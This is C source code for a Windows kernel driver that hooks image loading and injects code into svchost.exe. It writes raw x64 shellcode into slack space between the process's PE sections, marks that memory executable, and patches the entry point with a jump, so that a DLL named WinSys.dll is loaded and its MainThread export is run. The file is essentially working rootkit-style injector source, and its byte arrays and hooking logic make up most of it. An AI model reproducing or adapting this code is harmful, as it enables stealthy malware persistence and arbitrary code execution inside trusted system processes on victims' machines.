#include "HookEntry.h"

#pragma warning(disable:4100) 
#pragma warning(disable:4189) 
#pragma warning(disable:4996) 

DRIVER_INITIALIZE DriverEntry;

CHAR g_CreateToolhelp32Snapshot[]   = "CreateToolhelp32Snapshot";
CHAR g_GetProcAddress[]             = "GetProcAddress";
CHAR g_Module32First[]              = "Module32First";
CHAR g_RtlMoveMemory[]              = "RtlMoveMemory";
CHAR g_RtlZeroMemory[]              = "RtlZeroMemory";
CHAR g_LoadLibraryA[]               = "LoadLibraryA";
CHAR g_Module32Next[]               = "Module32Next";
CHAR g_VirtualAlloc[]               = "VirtualAlloc";
CHAR g_CloseHandle[]                = "CloseHandle";
CHAR g_FreeLibrary[]                = "FreeLibrary";
CHAR g_VirtualFree[]                = "VirtualFree";

CHAR    g_GlobleShellCode[0x320]    = { 0 };
PVOID   g_MyFunAddress[0x10]        = { 0 };
UINT32  g_KernelDllLoaded           = 0;
INT32   g_SvhostEntryRva            = 0;
INT32   g_SvhostHooked              = 0;
UINT32  g_MyFunNumber               = MYFUNCOUNT;
CHAR    g_ExportFun[]               = "MainThread";
CHAR    g_LoadDllA[]                = "WinSys.dll";
CHAR    g_OldCode[5]                = { 0 };
CHAR    g_NewCode[5]                = { 0xE9,0x00,0x00,0x00,0x00 };

CHAR    g_ShellCodeA[0x17D] = {

0x48,0x8B,0xC4,0x48,0x89,0x58,0x08,0x48,0x89,0x68,0x10,0x48,0x89,0x70,0x18,0x48,\
0x89,0x78,0x20,0x41,0x54,0x41,0x55,0x41,0x56,0x48,0x81,0xEC,0x60,0x02,0x00,0x00,\
0x48,0x8B,0xD9,0x48,0x83,0xC1,0x58,0xFF,0x13,0x48,0x8B,0xF0,0x48,0x85,0xC0,0x0F,\
0x84,0xFB,0x00,0x00,0x00,0x48,0x8D,0x53,0x78,0x48,0x8B,0xC8,0xFF,0x53,0x08,0x33,\
0xD2,0xC7,0x44,0x24,0x20,0x38,0x02,0x00,0x00,0x8D,0x4A,0x08,0x4C,0x8B,0xF0,0xFF,\
0x53,0x28,0x48,0x8B,0xF8,0x48,0x83,0xF8,0xFF,0x0F,0x84,0xD1,0x00,0x00,0x00,0x48,\
0x8D,0x54,0x24,0x20,0x48,0x8B,0xC8,0xFF,0x53,0x30,0x84,0xC0,0x75,0x0B,0x48,0x8B,\
0xCF,0xFF,0x53,0x40,0xE9,0xB7,0x00,0x00,0x00,0x48,0x8D,0x4C,0x24,0x50,0xFF,0x13,\
0x48,0x3B,0xC6,0x75,0x06,0x48,0x8B,0xC8,0xFF,0x53,0x20,0x48,0x8D,0x54,0x24,0x20,\
0x48,0x8B,0xCF,0xFF,0x53,0x38,0x84,0xC0,0x75,0xDF,0x48,0x8B,0xCF,0xFF,0x53,0x40,\
0x8B,0x46,0x3C,0x41,0xB9,0x40,0x00,0x00,0x00,0x8B,0x7C,0x30,0x50,0x8B,0x6C,0x30,\
0x54,0x41,0xB8,0x00,0x30,0x00,0x00,0x48,0x8B,0xD7,0x33,0xC9,0x4C,0x8B,0xEF,0xFF,\
0x53,0x10,0x4C,0x8B,0xE0,0x48,0x8B,0xD0,0x8B,0xC7,0x85,0xFF,0x74,0x1E,0x4C,0x8B,\
0xD6,0x4C,0x2B,0xD2,0x41,0x8A,0x0C,0x12,0x88,0x0A,0x48,0xFF,0xC2,0x85,0xED,0x74,\
0x06,0xC6,0x42,0xFF,0x00,0xFF,0xCD,0x83,0xE8,0x01,0x75,0xE8,0x48,0x8B,0xCE,0xFF,\
0x53,0x20,0x41,0xB9,0x40,0x00,0x00,0x00,0x41,0xB8,0x00,0x30,0x00,0x00,0x48,0x8B,\
0xD7,0x48,0x8B,0xCE,0xFF,0x53,0x10,0x4D,0x8B,0xC4,0x85,0xFF,0x74,0x10,0x41,0x8A,\
0x08,0x49,0xFF,0xC0,0x88,0x08,0x48,0xFF,0xC0,0x83,0xEF,0x01,0x75,0xF0,0x41,0xB8,\
0x00,0x40,0x00,0x00,0x49,0x8B,0xD5,0x49,0x8B,0xCC,0xFF,0x53,0x18,0x41,0xFF,0xD6,\
0x48,0x8B,0x8B,0x98,0x00,0x00,0x00,0x48,0x81,0xC3,0xA0,0x00,0x00,0x00,0xBA,0x05,\
0x00,0x00,0x00,0x8A,0x03,0x48,0xFF,0xC3,0x88,0x01,0x48,0xFF,0xC1,0x83,0xEA,0x01,\
0x75,0xF1,0x4C,0x8D,0x9C,0x24,0x60,0x02,0x00,0x00,0x33,0xC0,0x49,0x8B,0x5B,0x20,\
0x49,0x8B,0x6B,0x28,0x49,0x8B,0x73,0x30,0x49,0x8B,0x7B,0x38,0x49,0x8B,0xE3,0x41,\
0x5E,0x41,0x5D,0x41,0x5C,0xC3,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x00
};

CHAR g_ShellCodeB[0x18] = {
0x90,0x9C,0x48,0xB9,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xE8,0xAF,0x00,0x00,\
0x00,0x9D,0x90,0xE9,0x00,0x00,0x00,0x00
};

NTSTATUS
DeviceCreate(
  _In_ PDEVICE_OBJECT DeviceObject,
  _Inout_ PIRP Irp
)
{
  UNREFERENCED_PARAMETER(DeviceObject);
  Irp->IoStatus.Status = STATUS_SUCCESS;
  Irp->IoStatus.Information = 0;
  IoCompleteRequest(Irp, IO_NO_INCREMENT);
  return STATUS_SUCCESS;
}

NTSTATUS
DeviceClose(
  _In_ PDEVICE_OBJECT DeviceObject,
  _Inout_ PIRP Irp
)
{
  UNREFERENCED_PARAMETER(DeviceObject);
  Irp->IoStatus.Status = STATUS_SUCCESS;
  Irp->IoStatus.Information = 0;
  IoCompleteRequest(Irp, IO_NO_INCREMENT);
  return STATUS_SUCCESS;
}

VOID
DeviceUnload(
  _In_ PDRIVER_OBJECT DriverObject
){
  UNICODE_STRING DestinationString;
  RtlInitUnicodeString(&DestinationString, L"\\DosDevices\\DevBK");
  IoDeleteSymbolicLink(&DestinationString);
  IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS InitGloableFunction()
{
  UNICODE_STRING UtrZwQueryInformationProcessName = RTL_CONSTANT_STRING(L"ZwQueryInformationProcess");
  ZwQueryInformationProcess = (PfnZwQueryInformationProcess)MmGetSystemRoutineAddress(&UtrZwQueryInformationProcessName);
  return STATUS_SUCCESS;
}

NTSTATUS InitGloableFunctionA()
{
  UNICODE_STRING UtrpfnZwQuerySection = RTL_CONSTANT_STRING(L"ZwQuerySection");
  ZwQuerySection = (pfnZwQuerySection)MmGetSystemRoutineAddress(&UtrpfnZwQuerySection);
  return STATUS_SUCCESS;
}

NTSTATUS GetZwProtectVirtualMemory()
{
  CHAR FunHeaderCode[5] = { 0 };

  if (ZwQuerySection) 
  {
    PCHAR pSiteA = (PCHAR)ZwQuerySection - 0x5;
    PCHAR pSiteB = (PCHAR)ZwQuerySection - 0x800;

    // save fun sign( 5 bytes)
    for (INT i = 0; i < 5;i++)
        FunHeaderCode[i] = *((PCHAR)ZwQuerySection + i);

    for (; pSiteA >= pSiteB; pSiteA = pSiteA - 0x1) 
    {
      INT nCount = 0;

      for (INT j = 0; j < 5;j++) 
      {
        if (*(pSiteA + j) == FunHeaderCode[j])
            nCount++;
        else
            break;
      }

      if (nCount == 5) 
      {
        ZwProtectVirtualMemory = (PfnZwProtectVirtualMemory)pSiteA;
        return STATUS_SUCCESS;
      }
    }
  }
  return STATUS_SUCCESS;
}

// pe header
PVOID PeIsValideB(PVOID imagebase) {

  PVOID ret = 0;
  PVOID pTemp = imagebase;

  try
  {
    INT32 PeOff = *(PINT32)((PCHAR)imagebase + 0x3C);
    pTemp = (PVOID)((PCHAR)imagebase + PeOff);
    ProbeForRead(pTemp, 0x108, 1);
    ret = pTemp;
  }
  except(EXCEPTION_EXECUTE_HANDLER) {}
  return ret;
}

// dos header
PVOID PeIsValideA(PVOID imagebase) {

  PVOID ret = 0;

  try
  {
    ProbeForRead(imagebase,0x40,1);
    ret = imagebase;
  }

  except(EXCEPTION_EXECUTE_HANDLER) {}
  return ret;
}

// export table va
PVOID GetExportTableVa(PVOID imagebase) {

  PVOID ret = 0;
  PVOID pTemp = 0;
  PVOID pExport = 0;

  try
  {
    INT32 PeOff = *(PINT32)((PCHAR)imagebase + 0x3C);
    pTemp = (PVOID)((PCHAR)imagebase + PeOff + 0x88);
    INT32 ExportOff = *(PINT32)pTemp;
    pExport = (PVOID)((PCHAR)imagebase + ExportOff);
    ProbeForRead(pExport, 0x28, 1);
    ret = pExport;
  }
  except(EXCEPTION_EXECUTE_HANDLER) {}
  return ret;
}

// svhost.exe
PVOID GetSectionTableVa(PVOID ntheader) {

  PVOID ret = 0;

  try
  {
    ProbeForRead(ntheader, 8 * (*(PUINT16)((PCHAR)ntheader + 0x6)), 1);
    ret = (PVOID)((PINT16)ntheader + 0x84);
  }
  except(EXCEPTION_EXECUTE_HANDLER) {}
  return ret;
}

PVOID GetFunAddress(PVOID imagebase,CHAR*funcname) {

  PVOID DosHeader = PeIsValideA(imagebase);
  PVOID PeHeader = PeIsValideB(imagebase);
  PVOID TargetFunAddress = 0;

  try
  {
    if (DosHeader && PeHeader) 
    {
      // pe is valid ?
      if (*((PINT16)DosHeader) == 0x5A4D && *(PINT32)PeHeader == 0x4550) 
      {
        // export table va
        PVOID pExportVa = GetExportTableVa(imagebase);

        if (pExportVa)
        {
          ProbeForRead((PCHAR)pExportVa + 0x14, 0x4, 1);
          UINT32 NumFunc = *(PINT32)((PCHAR)pExportVa + 0x14);

          // number of names
          ProbeForRead((PCHAR)pExportVa + 0x18, 0x4, 1);
          UINT32 NumNames = *(PINT32)((PCHAR)pExportVa + 0x18);

          // address of functions
          ProbeForRead((PCHAR)pExportVa + 0x1c, 0x4, 1);
          UINT32 AddFunRva = *(PINT32)((PCHAR)pExportVa + 0x1c);
          PVOID AddFunVa = (PVOID)(AddFunRva + (PCHAR)imagebase);
          ProbeForRead(AddFunVa, NumFunc * 8, 1);

          // address of ordinals
          ProbeForRead((PCHAR)pExportVa + 0x24, 0x4, 1);
          UINT32 AddOrdinalRva = *(PINT32)((PCHAR)pExportVa + 0x24);
          PVOID AddOrdinalVa = (PVOID)(AddOrdinalRva + (PCHAR)imagebase);
          ProbeForRead(AddOrdinalVa, NumNames * 8, 1);

          // address of names
          ProbeForRead((PCHAR)pExportVa + 0x20, 0x4, 1);
          UINT32 AddNameRva = *(PINT32)((PCHAR)pExportVa + 0x20);
          PVOID AddNameVa = (PVOID)(AddNameRva + (PCHAR)imagebase);
          ProbeForRead(AddNameVa, NumNames * 8, 1);
          PUINT32 TempAddNameVa = (PUINT32)AddNameVa;
          
          for (UINT32 i = 0; i < NumNames; i++) 
          {
            if (strcmp(*TempAddNameVa + (PCHAR)imagebase, funcname) == 0) 
            {
              // hit
              UINT16 Oridinal = *(PUINT16)((PCHAR)AddOrdinalVa + i * sizeof(UINT16));
              UINT32 TarFunAddRva = *(PUINT32)((PCHAR)AddFunVa + Oridinal * sizeof(UINT32));
              TargetFunAddress = (PVOID)(TarFunAddRva + (PCHAR)imagebase);
              break;
            }

            TempAddNameVa++;
          }
        }
      }
    }
  }

  except(EXCEPTION_EXECUTE_HANDLER) {}
  return TargetFunAddress;
}

void NotifyRoutine(
  _In_opt_ PUNICODE_STRING FullImageName,
  _In_   HANDLE ProcessId,
  _In_   PIMAGE_INFO ImageInfo

) {

  // test SystemModeImage 

  // 1--kernel module

  // 0--user module

  wchar_t String[0x108];
  ULONG Retlen = 0;
  NTSTATUS RetCode = STATUS_SUCCESS;
  PROCESS_BASIC_INFORMATION ProcessInformation;

  if (ProcessId && !_bittest((const LONG*)ImageInfo,0x8) && FullImageName) 
  {
    if (FullImageName->MaximumLength > 0x104)
      memmove(String, FullImageName->Buffer, 0x104);
    else
      memmove(String, FullImageName->Buffer, FullImageName->MaximumLength);

    _wcsupr(String);

    if (g_KernelDllLoaded != 1 && wcsstr(String, L"KERNEL32.DLL")) 
    {
      DbgPrint("KERNEL32.DLL is loading.....\r\n");
      g_MyFunAddress[0] = GetFunAddress(ImageInfo->ImageBase, g_LoadLibraryA);
      g_MyFunAddress[1] = GetFunAddress(ImageInfo->ImageBase, g_GetProcAddress);
      g_MyFunAddress[2] = GetFunAddress(ImageInfo->ImageBase, g_VirtualAlloc);
      g_MyFunAddress[3] = GetFunAddress(ImageInfo->ImageBase, g_VirtualFree);
      g_MyFunAddress[4] = GetFunAddress(ImageInfo->ImageBase, g_FreeLibrary);
      g_MyFunAddress[5] = GetFunAddress(ImageInfo->ImageBase, g_CreateToolhelp32Snapshot);
      g_MyFunAddress[6] = GetFunAddress(ImageInfo->ImageBase, g_Module32First);
      g_MyFunAddress[7] = GetFunAddress(ImageInfo->ImageBase, g_Module32Next);
      g_MyFunAddress[8] = GetFunAddress(ImageInfo->ImageBase, g_CloseHandle);
      g_MyFunAddress[9] = GetFunAddress(ImageInfo->ImageBase, g_RtlMoveMemory);
      g_MyFunAddress[10] = GetFunAddress(ImageInfo->ImageBase, g_RtlZeroMemory);
      memmove(g_GlobleShellCode + 0x70, g_LoadDllA, strlen(g_LoadDllA));
      memmove(g_GlobleShellCode + 0x90, g_ExportFun, strlen(g_ExportFun));
      g_KernelDllLoaded = 1;
    }

    if (ZwQueryInformationProcess)
        RetCode = ZwQueryInformationProcess((HANDLE)-1, ProcessBasicInformation, &ProcessInformation, 0x30u, &Retlen);

    if (g_KernelDllLoaded == 1 && !RetCode)
    {
      PROCESS_BASIC_INFORMATION* pProcessInfo = &ProcessInformation;
      PPEB ppeb = pProcessInfo->PebBaseAddress;

      if (ppeb) 
      {
        PVOID ppImageBase = *(PVOID*)((PCHAR)ppeb + 0x10);

        if (ppImageBase == ImageInfo->ImageBase) 
        {
          if (wcsstr(String, L"SVCHOST.EXE") && !g_SvhostHooked) 
          {
            PVOID DosHeader = PeIsValideA(ImageInfo->ImageBase);
            PVOID PeHeader = PeIsValideB(ImageInfo->ImageBase);
            PVOID pSection = 0;
            PVOID pHookAddress = 0;
            size_t PreVirtualSize = 0;
            UINT32 PreVirtualAddress = 0;
            UINT32 CurVirtualAddress = 0;
            UINT32 NextVirtualAddress = 0;
            ULONG OldProtect = 0;

            if (DosHeader && PeHeader) 
            {
              try
              {
                UINT16 SectionCount     = *(PUINT16)((PCHAR)PeHeader + 0x6);
                g_SvhostEntryRva        = *((PINT32)PeHeader + 0xA);
                PCHAR g_SvhostEntryVa   = g_SvhostEntryRva + (PCHAR)ImageInfo->ImageBase;
                // KdBreakPoint();

                for (INT j = 0; j < 5; j++)
                    g_OldCode[j] = *(g_SvhostEntryVa + j);

                pSection = GetSectionTableVa(PeHeader);

                if (pSection) 
                {
                  for (INT i = 1; i <= SectionCount - 1;i++) 
                  {
                    PreVirtualSize      = *(PUINT32)((PCHAR)pSection + (0x28 * i - 0x20));
                    CurVirtualAddress   = *(UINT32*)((PCHAR)pSection + (0x28 * i + 0xC));
                    PreVirtualAddress   = *(UINT32*)((PCHAR)pSection + (0x28 * i - 0x1C));
                    NextVirtualAddress  = *(UINT32*)((PCHAR)pSection + (0x28 * i + 0x34));

                    if (CurVirtualAddress - PreVirtualAddress - PreVirtualSize >= 0x320) 
                    {
                      pHookAddress = (PVOID)((PCHAR)ImageInfo->ImageBase + PreVirtualAddress + PreVirtualSize);
                      INT64 SrcTDst = (INT64)pHookAddress - (INT64)g_SvhostEntryVa - 5;

                      for (INT k = 0; k < 4;k++) 
                        g_NewCode[ k + 1 ] = *((PCHAR)&SrcTDst + k);

                      *(PINT64)(g_ShellCodeB + 0x4) = ((INT64)pHookAddress + 0x18);
                      INT64 DstTSrc = (INT64)g_SvhostEntryVa - ((INT64)pHookAddress + 0x13) - 0x5;

                      for (INT l = 0;l < 4; l++)
                        g_ShellCodeB[0x14 + l] = *((PCHAR)&DstTSrc + l);

                      memmove(g_GlobleShellCode,g_ShellCodeB,0x18);
                      memmove(g_GlobleShellCode + 0x18, g_MyFunAddress,sizeof(PVOID)* g_MyFunNumber);
                      *(PINT64)(g_GlobleShellCode + 0xB0) = (INT64)g_SvhostEntryVa;

                      for (INT m = 0; m < 5; m++) 
                          *(g_GlobleShellCode + 0xB8 + m) = g_OldCode[m];

                      memmove(g_GlobleShellCode + 0xC0, g_ShellCodeA, sizeof(g_ShellCodeA));
                      SIZE_T MemReion = NextVirtualAddress - PreVirtualAddress;

                      if (ZwProtectVirtualMemory) 
                      {
                        PVOID pAdd = (PVOID)(PreVirtualAddress + (PCHAR)ImageInfo->ImageBase);
                        ZwProtectVirtualMemory((HANDLE)-1, &pAdd, &MemReion, PAGE_EXECUTE_READWRITE, &OldProtect);
                        PVOID re = memmove(pHookAddress, g_GlobleShellCode, sizeof(g_GlobleShellCode));

                        for (INT n = 0; n < 5; n++)
                          *(g_SvhostEntryVa + n) = g_NewCode[n];

                        //ZwProtectVirtualMemory((HANDLE)-1, &pAdd, &MemReion, OldProtect, &OldProtect);
                        g_SvhostHooked = 1;
                        //KdBreakPoint();
                        DbgPrint("SvcHost Loaded\r\n");
                        return;
                      }
                    }
                  }
                }
              }
              except(EXCEPTION_EXECUTE_HANDLER) {}
            }
          }
        }
      }
    }
  }

  return;
}

void StartRoutine(
  _In_ PVOID StartContext
) {
  if (!g_IsLoadNotifyRoutin) 
  {
    while (PsSetLoadImageNotifyRoutine(NotifyRoutine) == STATUS_SUCCESS) 
    {
      g_IsLoadNotifyRoutin = NotifyRoutine;
      break;
    }
  }
  return;
}

NTSTATUS
DriverEntry(
  _In_ PDRIVER_OBJECT   DriverObject,
  _In_ PUNICODE_STRING  RegistryPath
)
{  
  // KdBreakPoint();
  NTSTATUS status = STATUS_SUCCESS; 
  NTSTATUS result;
  PDEVICE_OBJECT StartContext;
  UNICODE_STRING DestinationString; 
  UNICODE_STRING SymbolicLinkName;
  HANDLE ThreadHandle;

  RtlInitUnicodeString(&DestinationString, L"\\Device\\DevBK");
  RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\DevBK");
  DriverObject->MajorFunction[IRP_MJ_CREATE] = DeviceCreate;
  DriverObject->MajorFunction[IRP_MJ_CLOSE] = DeviceClose;
  result = IoCreateDevice(DriverObject, 0, &DestinationString, FILE_DEVICE_UNKNOWN, 0, 0, &StartContext);

  if (result >= 0 && StartContext)
  {
      StartContext->Flags |= DO_BUFFERED_IO;
      StartContext->AlignmentRequirement = 1;
      IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
      DriverObject->DriverUnload = DeviceUnload;
      InitGloableFunction();
      InitGloableFunctionA();
      GetZwProtectVirtualMemory();
      PsCreateSystemThread(&ThreadHandle, 0, 0, 0, 0, (PKSTART_ROUTINE)StartRoutine, 0);
      ZwClose(ThreadHandle);
  }
  else
      status = STATUS_UNEXPECTED_IO_ERROR;

  return status;
}